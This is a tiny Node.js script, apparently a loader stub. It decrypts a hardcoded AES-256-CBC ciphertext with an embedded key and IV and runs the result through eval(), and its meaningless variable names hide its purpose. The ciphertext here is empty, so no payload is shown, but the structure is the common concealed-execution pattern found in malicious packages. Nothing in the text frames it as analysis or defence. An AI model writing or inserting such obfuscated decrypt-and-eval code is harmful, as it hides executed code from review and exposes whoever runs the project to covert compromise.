const ito = require('crypto');
const itinho = Buffer.from('5318e7434e377b99ff1d22e060fbc9f3504bbffc13a13630d635ab22422278d7', 'hex');
const octua = Buffer.from('0db0af498c59a362a83f250b3cc153f4', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
